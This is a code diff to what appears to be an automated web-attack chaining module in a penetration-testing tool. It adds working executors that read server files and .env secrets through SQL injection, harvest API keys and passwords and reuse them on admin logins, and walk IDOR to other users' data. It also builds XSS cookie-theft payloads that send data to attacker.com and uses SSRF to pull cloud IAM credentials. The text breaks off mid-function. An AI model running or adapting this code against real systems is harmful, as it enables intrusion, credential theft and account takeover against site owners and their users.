@@ -18,13 +18,135 @@ import re
 from datetime import datetime
 from typing import Any
 
+import httpx
 from app.utils.http_client import make_client
 
 logger = logging.getLogger(__name__)
 
 # Max steps per chain execution and timeout per step
-MAX_CHAIN_STEPS = 5
+MAX_CHAIN_STEPS = 10
 STEP_TIMEOUT = 30.0
+
+
+# ── Chain Context — passes state between chain steps ──
+
+class ChainContext:
+    """Accumulated state across chain steps.
+
+    When step 1 extracts credentials, step 2 can USE them.
+    This is what makes chains actually work as chains, not isolated tests.
+    """
+
+    def __init__(self):
+        self.tokens: list[dict] = []        # JWT, session tokens, API keys
+        self.credentials: list[dict] = []   # username:password pairs
+        self.internal_urls: list[dict] = [] # Internal URLs discovered via SSRF
+        self.files_read: dict[str, str] = {}  # filename → content from LFI/XXE
+        self.injected_data: dict[str, Any] = {}  # What we injected and where
+        self.responses: list[dict] = []     # Raw responses for analysis
+        self.extracted_ids: list[str] = []  # IDs harvested from responses
+        self.cookies: dict[str, str] = {}   # Cookies accumulated across steps
+        self.admin_endpoints: list[str] = []  # Admin paths discovered
+
+    def add_token(self, token: str, source: str):
+        self.tokens.append({"token": token, "source": source})
+
+    def add_credential(self, username: str, password: str, source: str):
+        self.credentials.append({
+            "username": username, "password": password, "source": source,
+        })
+
+    def add_internal_url(self, url: str, description: str):
+        self.internal_urls.append({"url": url, "description": description})
+
+    def add_file(self, path: str, content: str):
+        self.files_read[path] = content
+
+    def add_response(self, step: int, url: str, status: int, body: str):
+        self.responses.append({
+            "step": step, "url": url, "status": status,
+            "body_preview": body[:2000],
+        })
+
+    def get_auth_header(self) -> dict:
+        """Return best available auth header for next request."""
+        if self.tokens:
+            t = self.tokens[-1]["token"]
+            if t.startswith("eyJ"):
+                return {"Authorization": f"Bearer {t}"}
+            return {"Cookie": f"session={t}"}
+        if self.cookies:
+            cookie_str = "; ".join(f"{k}={v}" for k, v in self.cookies.items())
+            return {"Cookie": cookie_str}
+        return {}
+
+    def get_best_credential(self) -> dict | None:
+        """Return the most recently found credential pair."""
+        return self.credentials[-1] if self.credentials else None
+
+    def to_evidence_dict(self) -> dict:
+        """Serialize context to store in vulnerability response_data."""
+        return {
+            "tokens_found": len(self.tokens),
+            "tokens": [{"source": t["source"], "token_preview": t["token"][:20] + "..."} for t in self.tokens],
+            "credentials_found": len(self.credentials),
+            "credentials": [
+                {"username": c["username"], "source": c["source"]}
+                for c in self.credentials
+            ],
+            "internal_urls": self.internal_urls[:20],
+            "files_read": list(self.files_read.keys()),
+            "extracted_ids": self.extracted_ids[:20],
+            "admin_endpoints": self.admin_endpoints[:10],
+        }
+
+
+# ── Token / credential extraction helpers ──
+
+_TOKEN_PATTERNS = [
+    (r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', "jwt"),
+    (r'(?:access_token|token|api_key|apikey|secret)["\s:=]+["\']?([A-Za-z0-9_\-]{20,})', "api_key"),
+    (r'AKIA[0-9A-Z]{16}', "aws_access_key"),
+    (r'(?:sk_live_|sk_test_)[A-Za-z0-9]{24,}', "stripe_key"),
+    (r'ghp_[A-Za-z0-9_]{36}', "github_pat"),
+    (r'xox[bpsa]-[A-Za-z0-9\-]+', "slack_token"),
+]
+
+_CREDENTIAL_PATTERNS = [
+    (r'(?:DB_PASSWORD|DATABASE_PASSWORD|MYSQL_PASSWORD|POSTGRES_PASSWORD)\s*[=:]\s*["\']?([^\s"\']+)', "db_password"),
+    (r'(?:DB_USER|DATABASE_USER|MYSQL_USER)\s*[=:]\s*["\']?([^\s"\']+)', "db_user"),
+    (r'(?:SECRET_KEY|APP_SECRET|JWT_SECRET)\s*[=:]\s*["\']?([^\s"\']+)', "app_secret"),
+    (r'(?:ADMIN_PASSWORD|ROOT_PASSWORD)\s*[=:]\s*["\']?([^\s"\']+)', "admin_password"),
+    (r'(?:AWS_SECRET_ACCESS_KEY)\s*[=:]\s*["\']?([^\s"\']+)', "aws_secret"),
+]
+
+_INTERNAL_URL_PATTERN = re.compile(
+    r'https?://(?:127\.\d+\.\d+\.\d+|10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+|localhost)(?::\d+)?[/\w\-]*'
+)
+
+
+def _extract_tokens(text: str) -> list[tuple[str, str]]:
+    """Extract tokens/keys from response text."""
+    found = []
+    for pattern, token_type in _TOKEN_PATTERNS:
+        for m in re.finditer(pattern, text):
+            val = m.group(1) if m.lastindex else m.group(0)
+            found.append((val, token_type))
+    return found
+
+
+def _extract_credentials(text: str) -> list[tuple[str, str, str]]:
+    """Extract credential pairs from text (value, type, source)."""
+    found = []
+    for pattern, cred_type in _CREDENTIAL_PATTERNS:
+        for m in re.finditer(pattern, text, re.IGNORECASE):
+            found.append((m.group(1), cred_type, pattern))
+    return found
+
+
+def _extract_internal_urls(text: str) -> list[str]:
+    """Extract internal/private IP URLs from text."""
+    return list(set(_INTERNAL_URL_PATTERN.findall(text)))
 
 # ── Impact severity ranking for chain sorting ──
 IMPACT_RANK = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
@@ -285,6 +407,7 @@ CHAIN_TEMPLATES = [
         "steps": [
             "Confirm sensitive file exposure (.env, config, backup)",
             "Extract database credentials or API keys from exposed file",
+            "Extract internal URLs from disclosed configuration",
             "Test extracted credentials against discovered services",
             "Report data accessible via leaked credentials",
         ],
@@ -295,6 +418,51 @@ CHAIN_TEMPLATES = [
             "Add .env, *.bak, *.sql to .gitignore and server deny rules",
             "Rotate any credentials that may have been exposed",
             "Use secrets management (Vault, AWS Secrets Manager)",
+        ],
+    },
+
+    # ── NEW: LFI → Log Poisoning → RCE chain ──
+    {
+        "name": "lfi_log_poisoning_rce",
+        "trigger": "lfi",
+        "also_triggers": ["path_traversal"],
+        "description": "LFI → Log Poisoning → Remote Code Execution",
+        "impact": "critical",
+        "steps": [
+            "Use LFI to read server log files (access.log, error.log)",
+            "Inject PHP code into log via User-Agent header",
+            "Include poisoned log file via LFI with command parameter",
+            "Verify RCE by checking command output in response",
+        ],
+        "test": "_chain_lfi_log_poisoning_rce",
+        "executor": "_exec_lfi_log_poisoning_rce",
+        "recommendations": [
+            "Validate and sanitize all file path inputs",
+            "Use a whitelist of allowed files for inclusion",
+            "Disable PHP wrappers and remote file inclusion",
+            "Store logs outside web root with restricted permissions",
+        ],
+    },
+
+    # ── NEW: Info Disclosure → SSRF → Internal Access ──
+    {
+        "name": "info_to_ssrf_internal",
+        "trigger": "info_disclosure",
+        "description": "Info Disclosure → Internal URLs → SSRF to Internal Services",
+        "impact": "critical",
+        "steps": [
+            "Scan for exposed .env, config, admin panels",
+            "Extract internal URLs/IPs from disclosed data",
+            "Use SSRF or direct access to reach internal services",
+            "Extract data from internal services",
+        ],
+        "test": "_chain_info_to_ssrf",
+        "executor": "_exec_info_to_ssrf",
+        "recommendations": [
+            "Remove configuration files from web root",
+            "Implement network segmentation for internal services",
+            "Use URL allowlisting for outbound requests",
+            "Rotate all leaked internal credentials",
         ],
     },
 ]
@@ -390,20 +558,25 @@ async def execute_chain(
 
     # If there's a dedicated executor, use it
     chain_engine = AttackChainModule()
+    chain_ctx = ChainContext()
     executor_func = getattr(chain_engine, executor_name, None) if executor_name else None
 
     if executor_func:
         try:
             exec_result = await asyncio.wait_for(
-                executor_func(initial_vuln, context),
+                executor_func(initial_vuln, context, chain_ctx),
                 timeout=STEP_TIMEOUT * MAX_CHAIN_STEPS,
             )
             result.update(exec_result)
+            # Store chain context data as proof
+            result["chain_context"] = chain_ctx.to_evidence_dict()
         except asyncio.TimeoutError:
             result["impact"] = f"Chain timed out after {STEP_TIMEOUT * MAX_CHAIN_STEPS}s"
+            result["chain_context"] = chain_ctx.to_evidence_dict()
             logger.warning(f"Chain {chain_name} timed out")
         except Exception as e:
             result["impact"] = f"Chain execution error: {e}"
+            result["chain_context"] = chain_ctx.to_evidence_dict()
             logger.warning(f"Chain {chain_name} error: {e}")
     else:
         # Fall back to the legacy test method
@@ -597,14 +770,19 @@ class AttackChainModule:
     # ═══════════════════════════════════════════════════════════════════
     # NEW Multi-Step Chain Executors
     # Each returns a dict with: steps_completed, evidence, impact, verified
+    # All accept ChainContext for state passing between steps.
     # ═══════════════════════════════════════════════════════════════════
 
-    async def _exec_sqli_data_exfil(self, trigger: dict, ctx: dict) -> dict:
-        """SQLi -> Data Exfiltration -> Credential Theft chain."""
+    async def _exec_sqli_data_exfil(self, trigger: dict, ctx: dict,
+                                     chain_ctx: ChainContext = None) -> dict:
+        """SQLi -> Data Exfiltration -> Credential Theft -> Auth Bypass chain."""
+        if chain_ctx is None:
+            chain_ctx = ChainContext()
         url = trigger.get("url", "")
         param = trigger.get("parameter", "")
         payload_used = trigger.get("payload_used", "")
         method = (trigger.get("method") or "GET").upper()
+        base_url = ctx.get("base_url", "")
         evidence = []
         steps_completed = 0
 
@@ -643,8 +821,8 @@ class AttackChainModule:
                     else:
                         resp = await client.get(url, params={param: tbl_payload})
 
+                    chain_ctx.add_response(2, url, resp.status_code, resp.text)
                     body = resp.text.lower()
-                    # Look for common table names in response
                     common_tables = ["users", "accounts", "admin", "sessions",
                                      "orders", "customers", "members", "login",
                                      "credentials", "passwords", "config"]
@@ -678,6 +856,7 @@ class AttackChainModule:
         ]
 
         creds_found = False
+        cred_response_text = ""
         cred_indicators = ["admin", "root", "password", "hash", "$2b$", "$2a$",
                            "md5", "sha1", "sha256", "@"]
 
@@ -689,8 +868,13 @@ class AttackChainModule:
                     else:
                         resp = await client.get(url, params={param: cred_payload})
 
+                    chain_ctx.add_response(3, url, resp.status_code, resp.text)
                     if any(ind in resp.text.lower() for ind in cred_indicators):
                         creds_found = True
+                        cred_response_text = resp.text
+                        # Extract tokens from the response
+                        for token, ttype in _extract_tokens(resp.text):
+                            chain_ctx.add_token(token, f"sqli_exfil_{ttype}")
                         break
                 except Exception:
                     continue
@@ -710,25 +894,106 @@ class AttackChainModule:
             })
             steps_completed = 3
 
+        # Step 4: Try file read via LOAD_FILE (MySQL) for .env / config
+        file_read_payloads = [
+            ("' UNION SELECT LOAD_FILE('/var/www/.env')-- -", "/var/www/.env"),
+            ("' UNION SELECT LOAD_FILE('/var/www/html/.env')-- -", "/var/www/html/.env"),
+            ("' UNION SELECT LOAD_FILE('/etc/passwd')-- -", "/etc/passwd"),
+        ]
+
+        file_read_success = False
+        async with make_client(timeout=10.0) as client:
+            for file_payload, file_path in file_read_payloads:
+                try:
+                    if method == "POST":
+                        resp = await client.post(url, data={param: file_payload})
+                    else:
+                        resp = await client.get(url, params={param: file_payload})
+
+                    chain_ctx.add_response(4, url, resp.status_code, resp.text)
+                    # Check for file content indicators
+                    if file_path == "/etc/passwd" and "root:" in resp.text:
+                        chain_ctx.add_file(file_path, resp.text[:2000])
+                        file_read_success = True
+                        break
+                    elif ".env" in file_path and any(
+                        k in resp.text for k in ["DB_", "SECRET", "KEY", "PASSWORD"]
+                    ):
+                        chain_ctx.add_file(file_path, resp.text[:2000])
+                        # Extract credentials from .env content
+                        for val, ctype, _ in _extract_credentials(resp.text):
+                            chain_ctx.add_credential(ctype, val, f"sqli_file_read:{file_path}")
+                        for token, ttype in _extract_tokens(resp.text):
+                            chain_ctx.add_token(token, f"sqli_file_read:{file_path}")
+                        file_read_success = True
+                        break
+                except Exception:
+                    continue
+
+        if file_read_success:
+            evidence.append({
+                "step": 4,
+                "action": "Read server files via SQL LOAD_FILE",
+                "result": f"Files read: {', '.join(chain_ctx.files_read.keys())}",
+            })
+            steps_completed = 4
+
+        # Step 5: If we got credentials, try to use them on admin panel
+        admin_accessed = False
+        if chain_ctx.credentials and base_url:
+            admin_paths = ["/admin", "/admin/login", "/login", "/api/auth/login"]
+            best_cred = chain_ctx.get_best_credential()
+            if best_cred:
+                async with make_client(timeout=10.0) as client:
+                    for apath in admin_paths:
+                        try:
+                            login_url = base_url.rstrip("/") + apath
+                            resp = await client.post(login_url, json={
+                                "username": best_cred["username"],
+                                "password": best_cred["password"],
+                            })
+                            chain_ctx.add_response(5, login_url, resp.status_code, resp.text)
+                            if resp.status_code in (200, 302):
+                                for token, ttype in _extract_tokens(resp.text):
+                                    chain_ctx.add_token(token, "sqli_chain_login")
+                                admin_accessed = True
+                                break
+                        except Exception:
+                            continue
+
+            if admin_accessed:
+                evidence.append({
+                    "step": 5,
+                    "action": "Used extracted credentials to access admin panel",
+                    "result": "Admin access achieved using leaked credentials",
+                })
+                steps_completed = 5
+
         return {
             "steps_completed": steps_completed,
             "evidence": evidence,
             "impact": (
                 "SQL injection allows full database read. "
                 + (f"Found tables: {', '.join(tables_found)}. " if tables_found else "")
-                + ("Extracted user credentials with password hashes." if creds_found
+                + ("Extracted user credentials with password hashes. " if creds_found else "")
+                + (f"Read server files: {', '.join(chain_ctx.files_read.keys())}. " if chain_ctx.files_read else "")
+                + ("Admin access achieved via extracted credentials." if admin_accessed
                    else "Further exploitation may require manual testing.")
             ),
             "verified": steps_completed >= 2 and (bool(tables_found) or creds_found),
         }
 
-    async def _exec_idor_privilege_escalation(self, trigger: dict, ctx: dict) -> dict:
-        """IDOR -> Privilege Escalation chain."""
+    async def _exec_idor_privilege_escalation(self, trigger: dict, ctx: dict,
+                                               chain_ctx: ChainContext = None) -> dict:
+        """IDOR -> Data Exfil -> Privilege Escalation -> Admin Access chain."""
+        if chain_ctx is None:
+            chain_ctx = ChainContext()
         url = trigger.get("url", "")
+        base_url = ctx.get("base_url", "")
         evidence = []
         steps_completed = 0
 
-        # Step 1: Confirm IDOR
+        # Step 1: Confirm IDOR — access own resource
         evidence.append({
             "step": 1,
             "action": f"Confirmed IDOR at {url}",
@@ -744,20 +1009,70 @@ class AttackChainModule:
                 "verified": False,
             }
 
-        # Step 2: Try accessing admin profile (id=1, id=0, id=admin)
+        # Step 2: Access other user's data (id+1, id-1, id=2)
         id_match = re.search(r'/(\d+)(?:/|$|\?)', url)
-        admin_accessible = False
-        admin_content = ""
+        other_user_data = False
+        other_user_content = ""
 
         if id_match:
             original_id = id_match.group(1)
-            admin_ids = ["1", "0", "admin"]
+            n = int(original_id)
+            # Test adjacent and common IDs
+            test_ids = [str(v) for v in [n - 1, n + 1, n + 10, n + 100, 2, 3] if v > 0 and v != n]
 
+            async with make_client(timeout=10.0) as client:
+                # Get baseline
+                try:
+                    baseline_resp = await client.get(url)
+                    baseline_body = baseline_resp.text if baseline_resp.status_code == 200 else ""
+                except Exception:
+                    baseline_body = ""
+
+                for test_id in test_ids:
+                    test_url = url.replace(f"/{original_id}", f"/{test_id}")
+                    try:
+                        resp = await client.get(test_url)
+                        chain_ctx.add_response(2, test_url, resp.status_code, resp.text)
+                        if (resp.status_code == 200
+                                and len(resp.text) > 50
+                                and resp.text != baseline_body):
+                            other_user_data = True
+                            other_user_content = resp.text[:2000]
+                            chain_ctx.extracted_ids.append(test_id)
+                            # Extract any tokens from the response
+                            for token, ttype in _extract_tokens(resp.text):
+                                chain_ctx.add_token(token, f"idor_user_{test_id}")
+                            break
+                    except Exception:
+                        continue
+
+        if other_user_data:
+            evidence.append({
+                "step": 2,
+                "action": "Accessed other user's data via IDOR",
+                "result": f"Different user data returned ({len(other_user_content)} bytes)",
+            })
+            steps_completed = 2
+        else:
+            evidence.append({
+                "step": 2,
+                "action": "Attempted cross-user data access",
+                "result": "Could not confirm cross-user data access",
+            })
+            steps_completed = 2
+
+        # Step 3: Try accessing admin profile (id=1, id=0)
+        admin_accessible = False
+        admin_content = ""
+        if id_match:
+            original_id = id_match.group(1)
+            admin_ids = ["1", "0", "admin"]
             async with make_client(timeout=10.0) as client:
                 for admin_id in admin_ids:
                     test_url = url.replace(f"/{original_id}", f"/{admin_id}")
                     try:
                         resp = await client.get(test_url)
+                        chain_ctx.add_response(3, test_url, resp.status_code, resp.text)
                         if resp.status_code == 200 and len(resp.text) > 50:
                             body_lower = resp.text.lower()
                             admin_indicators = ["admin", "superuser", "root",
@@ -765,28 +1080,31 @@ class AttackChainModule:
                                                 "manage", "dashboard"]
                             if any(ind in body_lower for ind in admin_indicators):
                                 admin_accessible = True
-                                admin_content = resp.text[:500]
+                                admin_content = resp.text[:2000]
+                                for token, ttype in _extract_tokens(resp.text):
+                                    chain_ctx.add_token(token, f"idor_admin_{admin_id}")
                                 break
                     except Exception:
                         continue
 
         if admin_accessible:
             evidence.append({
-                "step": 2,
-                "action": "Accessed admin profile via IDOR (id=1)",
+                "step": 3,
+                "action": "Accessed admin profile via IDOR",
                 "result": "Admin profile data accessible, admin role confirmed",
             })
-            steps_completed = 2
+            steps_completed = 3
         else:
             evidence.append({
-                "step": 2,
+                "step": 3,
                 "action": "Attempted admin profile access",
                 "result": "Could not confirm admin-level access via ID manipulation",
             })
-            steps_completed = 2
+            steps_completed = 3
 
-        # Step 3: Look for admin endpoints in the response
+        # Step 4: Extract admin endpoints from response and try them
         admin_endpoints_found = []
+        admin_ep_accessible = []
         if admin_content:
             admin_patterns = [
                 r'href=["\']([^"\']*admin[^"\']*)["\']',
@@ -794,39 +1112,55 @@ class AttackChainModule:
                 r'href=["\']([^"\']*dashboard[^"\']*)["\']',
                 r'href=["\']([^"\']*settings[^"\']*)["\']',
                 r'action=["\']([^"\']*)["\']',
+                r'"(?:url|path|href|endpoint)":\s*"([^"]*(?:admin|manage|config)[^"]*)"',
             ]
             for pattern in admin_patterns:
                 matches = re.findall(pattern, admin_content, re.IGNORECASE)
                 admin_endpoints_found.extend(matches[:3])
+            chain_ctx.admin_endpoints = admin_endpoints_found[:10]
+
+            # Actually try accessing the admin endpoints
+            if admin_endpoints_found and base_url:
+                async with make_client(
+                    extra_headers=chain_ctx.get_auth_header(), timeout=10.0,
+                ) as client:
+                    for ep in admin_endpoints_found[:5]:
+                        try:
+                            ep_url = ep if ep.startswith("http") else base_url.rstrip("/") + "/" + ep.lstrip("/")
+                            resp = await client.get(ep_url)
+                            if resp.status_code == 200 and len(resp.text) > 100:
+                                admin_ep_accessible.append(ep)
+                        except Exception:
+                            continue
 
         if admin_endpoints_found:
             evidence.append({
-                "step": 3,
+                "step": 4,
                 "action": "Enumerated admin endpoints from admin profile",
-                "result": f"Found admin endpoints: {', '.join(admin_endpoints_found[:5])}",
+                "result": (
+                    f"Found: {', '.join(admin_endpoints_found[:5])}. "
+                    + (f"Accessible: {', '.join(admin_ep_accessible[:3])}" if admin_ep_accessible else "")
+                ),
             })
-            steps_completed = 3
-        else:
-            evidence.append({
-                "step": 3,
-                "action": "Attempted admin endpoint enumeration",
-                "result": "No additional admin endpoints discovered in response",
-            })
-            steps_completed = 3
+            steps_completed = 4
 
         return {
             "steps_completed": steps_completed,
             "evidence": evidence,
             "impact": (
                 "IDOR vulnerability allows privilege escalation. "
+                + ("Cross-user data access confirmed. " if other_user_data else "")
                 + ("Admin profile accessible via ID manipulation. " if admin_accessible else "")
-                + (f"Admin endpoints found: {', '.join(admin_endpoints_found[:3])}" if admin_endpoints_found else "")
+                + (f"Admin endpoints accessible: {', '.join(admin_ep_accessible[:3])}" if admin_ep_accessible else "")
             ),
-            "verified": admin_accessible,
+            "verified": other_user_data or admin_accessible,
         }
 
-    async def _exec_file_upload_rce(self, trigger: dict, ctx: dict) -> dict:
+    async def _exec_file_upload_rce(self, trigger: dict, ctx: dict,
+                                     chain_ctx: ChainContext = None) -> dict:
         """File Upload -> Type Bypass -> Webshell -> RCE chain."""
+        if chain_ctx is None:
+            chain_ctx = ChainContext()
         url = trigger.get("url", "")
         evidence = []
         steps_completed = 0
@@ -926,19 +1260,62 @@ class AttackChainModule:
             "verified": bool(bypasses_possible),
         }
 
-    async def _exec_xss_session_hijack(self, trigger: dict, ctx: dict) -> dict:
-        """XSS -> Cookie Stealing -> Session Hijack chain."""
+    async def _exec_xss_session_hijack(self, trigger: dict, ctx: dict,
+                                       chain_ctx: ChainContext = None) -> dict:
+        """XSS -> Confirm Reflection -> Cookie Analysis -> Session Hijack PoC chain."""
+        if chain_ctx is None:
+            chain_ctx = ChainContext()
         url = trigger.get("url", "")
         param = trigger.get("parameter", "")
         base_url = ctx.get("base_url", "")
+        method = (trigger.get("method") or "GET").upper()
         evidence = []
         steps_completed = 0
 
-        # Step 1: Confirm XSS
+        # Step 1: Confirm XSS with unique marker
+        import random
+        marker = f"xss{random.randint(10000, 99999)}"
+        xss_confirmed = False
+        reflection_context = "unknown"
+
+        if url and param:
+            test_payloads = [
+                f'<img src=x onerror=alert("{marker}")>',
+                f'"><script>alert("{marker}")</script>',
+                f"'-alert('{marker}')-'",
+            ]
+            async with make_client(timeout=10.0) as client:
+                for payload in test_payloads:
+                    try:
+                        if method == "POST":
+                            resp = await client.post(url, data={param: payload})
+                        else:
+                            resp = await client.get(url, params={param: payload})
+                        chain_ctx.add_response(1, url, resp.status_code, resp.text)
+                        if marker in resp.text:
+                            xss_confirmed = True
+                            # Determine reflection context
+                            idx = resp.text.find(marker)
+                            surrounding = resp.text[max(0, idx - 100):idx + 100].lower()
+                            if "<script" in surrounding:
+                                reflection_context = "script_tag"
+                            elif "onerror" in surrounding or "onload" in surrounding:
+                                reflection_context = "event_handler"
+                            elif '<textarea' in surrounding or '<!--' in surrounding:
+                                reflection_context = "non_executable (textarea/comment)"
+                            else:
+                                reflection_context = "html_body"
+                            break
+                    except Exception:
+                        continue
+
         evidence.append({
             "step": 1,
-            "action": f"Confirmed XSS at {url} (param: {param})",
-            "result": "XSS payload executes in browser context",
+            "action": f"XSS reflection test at {url} (param: {param})",
+            "result": (
+                f"Confirmed: marker reflected in {reflection_context} context"
+                if xss_confirmed else "Using previously confirmed XSS"
+            ),
         })
         steps_completed = 1
 
@@ -957,8 +1334,7 @@ class AttackChainModule:
                     secure = "secure" in cookie_header.lower()
                     samesite = "samesite" in cookie_header.lower()
                 else:
-                    # No cookies set — can't steal what doesn't exist
-                    httponly = True  # Treat as safe
+                    httponly = True
             except Exception:
                 pass
 
@@ -983,19 +1359,26 @@ class AttackChainModule:
         # Step 3: Craft session hijack PoC payload
         if not httponly:
             poc_payload = (
-                f'<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>'
+                '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>'
             )
-            hijack_risk = "HIGH — cookies accessible via JavaScript"
+            hijack_risk = "HIGH - cookies accessible via JavaScript"
         else:
             poc_payload = (
-                f'<script>fetch("https://attacker.com/log?url="+location.href)</script>'
+                '<script>fetch("https://attacker.com/log?url="+location.href)</script>'
             )
-            hijack_risk = "MEDIUM — HttpOnly prevents direct cookie theft but XSS can perform actions"
+            hijack_risk = "MEDIUM - HttpOnly prevents direct cookie theft but XSS can perform actions"
+
+        # Build full PoC URL
+        if url and param:
+            from urllib.parse import quote
+            poc_url = f"{url}?{param}={quote(poc_payload)}" if method == "GET" else url
+        else:
+            poc_url = url
 
         evidence.append({
             "step": 3,
-            "action": "Crafted session hijack PoC payload",
-            "result": f"Risk: {hijack_risk}. PoC: {poc_payload[:100]}",
+            "action": "Crafted session hijack PoC",
+            "result": f"Risk: {hijack_risk}. PoC URL: {poc_url[:200]}",
         })
         steps_completed = 3
 
@@ -1005,12 +1388,16 @@ class AttackChainModule:
             "impact": (
                 f"XSS enables session hijack. {hijack_risk}. "
                 + (f"Cookie issues: {', '.join(cookie_issues)}. " if cookie_issues else "")
+                + f"Reflection context: {reflection_context}."
             ),
-            "verified": not httponly,  # Verified if cookies are stealable
+            "verified": not httponly,
         }
 
-    async def _exec_ssrf_internal_scan(self, trigger: dict, ctx: dict) -> dict:
-        """SSRF -> Internal Network Probe -> Cloud Metadata chain."""
+    async def _exec_ssrf_internal_scan(self, trigger: dict, ctx: dict,
+                                       chain_ctx: ChainContext = None) -> dict:
+        """SSRF -> Internal Network Probe -> Cloud Metadata -> IAM Credential Theft chain."""
+        if chain_ctx is None:
+            chain_ctx = ChainContext()
         url = trigger.get("url", "")
         param = trigger.get("parameter", "")
         method = (trigger.get("method") or "GET").upper()
@@ -1033,6 +1420,26 @@ class AttackChainModule:
                 "verified": False,
             }
 
+        async def _ssrf_fetch(client, target_url: str) -> httpx.Response | None:
+            """Helper to send SSRF request."""
+            try:
+                if method == "POST":
+                    return await client.post(url, data={param: target_url})
+                else:
+                    return await client.get(url, params={param: target_url})
+            except Exception:
+                return None
+
+        def _is_real_response(resp, error_words=None):
+            """Check if SSRF response contains real data (not error)."""
+            if not resp or resp.status_code != 200 or len(resp.text) < 20:
+                return False
+            err_words = error_words or [
+                "could not connect", "connection refused",
+                "timeout", "unreachable", "not found",
+            ]
+            return not any(e in resp.text.lower() for e in err_words)
+
         # Step 2: Probe internal IPs and services
         internal_targets = [
             ("http://127.0.0.1:80", "Local web server"),
@@ -1040,6 +1447,9 @@ class AttackChainModule:
             ("http://127.0.0.1:3000", "Internal API/Node"),
             ("http://127.0.0.1:6379", "Redis"),
             ("http://127.0.0.1:5432", "PostgreSQL"),
+            ("http://127.0.0.1:27017", "MongoDB"),
+            ("http://127.0.0.1:9200", "Elasticsearch"),
+            ("http://127.0.0.1:2375", "Docker socket"),
             ("http://10.0.0.1", "Internal gateway"),
             ("http://172.17.0.1", "Docker gateway"),
             ("http://192.168.1.1", "LAN gateway"),
@@ -1048,26 +1458,21 @@ class AttackChainModule:
         accessible_internal = []
         async with make_client(timeout=10.0) as client:
             for target_url, description in internal_targets:
-                try:
-                    if method == "POST":
-                        resp = await client.post(url, data={param: target_url})
-                    else:
-                        resp = await client.get(url, params={param: target_url})
-
-                    # Check if response differs from a baseline error
-                    if resp.status_code == 200 and len(resp.text) > 20:
-                        # Check for indicators that the internal service responded
-                        if not any(err in resp.text.lower() for err in
-                                   ["could not connect", "connection refused",
-                                    "timeout", "unreachable", "not found"]):
-                            accessible_internal.append({
-                                "target": target_url,
-                                "description": description,
-                                "response_length": len(resp.text),
-                                "snippet": resp.text[:200],
-                            })
-                except Exception:
-                    continue
+                resp = await _ssrf_fetch(client, target_url)
+                if _is_real_response(resp):
+                    chain_ctx.add_internal_url(target_url, description)
+                    chain_ctx.add_response(2, target_url, resp.status_code, resp.text)
+                    # Extract tokens/creds from internal service responses
+                    for token, ttype in _extract_tokens(resp.text):
+                        chain_ctx.add_token(token, f"ssrf_internal_{description}")
+                    for iurl in _extract_internal_urls(resp.text):
+                        chain_ctx.add_internal_url(iurl, "discovered_from_internal")
+                    accessible_internal.append({
+                        "target": target_url,
+                        "description": description,
+                        "response_length": len(resp.text),
+                        "snippet": resp.text[:200],
+                    })
 
         if accessible_internal:
             evidence.append({
@@ -1084,44 +1489,94 @@ class AttackChainModule:
             })
             steps_completed = 2
 
-        # Step 3: Probe cloud metadata services
-        cloud_targets = [
-            ("http://169.254.169.254/latest/meta-data/", "AWS metadata",
-             ["ami-id", "instance-id", "iam", "security-credentials"]),
-            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-             "AWS IAM credentials", ["AccessKeyId", "SecretAccessKey", "Token"]),
-            ("http://metadata.google.internal/computeMetadata/v1/",
-             "GCP metadata", ["project", "instance", "attributes"]),
-            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
-             "Azure metadata", ["vmId", "subscriptionId", "resourceGroup"]),
-            ("http://100.100.100.200/latest/meta-data/",
-             "Alibaba Cloud metadata", ["instance-id", "region-id"]),
-        ]
-
+        # Step 3: Probe cloud metadata — get IAM role name first
+        iam_role_name = ""
         cloud_accessible = []
+
         async with make_client(timeout=10.0) as client:
-            for target_url, description, indicators in cloud_targets:
-                try:
-                    headers = {}
-                    # GCP requires this header
-                    if "google.internal" in target_url:
-                        headers = {"Metadata-Flavor": "Google"}
+            # AWS: Step 3a — get role name
+            resp = await _ssrf_fetch(
+                client,
+                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            )
+            if _is_real_response(resp):
+                # Response is the role name (plain text)
+                role_name = resp.text.strip().split("\n")[0].strip()
+                if role_name and not role_name.startswith("<") and len(role_name) < 200:
+                    iam_role_name = role_name
+                    cloud_accessible.append({
+                        "target": "AWS IAM role name",
+                        "description": f"IAM role: {role_name}",
+                        "snippet": resp.text[:300],
+                    })
+                    chain_ctx.add_response(3, "iam_role_name", resp.status_code, resp.text)
 
-                    if method == "POST":
-                        resp = await client.post(url, data={param: target_url})
-                    else:
-                        resp = await client.get(url, params={param: target_url})
+            # AWS: Step 3b — get actual credentials using role name
+            if iam_role_name:
+                cred_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{iam_role_name}"
+                resp = await _ssrf_fetch(client, cred_url)
+                if resp and resp.status_code == 200:
+                    body = resp.text
+                    if "AccessKeyId" in body:
+                        cloud_accessible.append({
+                            "target": cred_url,
+                            "description": "AWS IAM credentials (AccessKeyId + SecretAccessKey + Token)",
+                            "snippet": body[:500],
+                        })
+                        # Extract AWS keys
+                        ak_match = re.search(r'"AccessKeyId"\s*:\s*"([^"]+)"', body)
+                        sk_match = re.search(r'"SecretAccessKey"\s*:\s*"([^"]+)"', body)
+                        tk_match = re.search(r'"Token"\s*:\s*"([^"]+)"', body)
+                        if ak_match:
+                            chain_ctx.add_token(ak_match.group(1), "aws_access_key_id")
+                        if sk_match:
+                            chain_ctx.add_credential(
+                                "AWS_SECRET_ACCESS_KEY", sk_match.group(1)[:10] + "...",
+                                "ssrf_iam_credentials",
+                            )
+                        if tk_match:
+                            chain_ctx.add_token(tk_match.group(1)[:50] + "...", "aws_session_token")
 
-                    if resp.status_code == 200:
-                        body = resp.text
-                        if any(ind in body for ind in indicators):
-                            cloud_accessible.append({
-                                "target": target_url,
-                                "description": description,
-                                "snippet": body[:300],
-                            })
-                except Exception:
-                    continue
+            # GCP metadata
+            resp = await _ssrf_fetch(
+                client,
+                "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
+            )
+            if _is_real_response(resp):
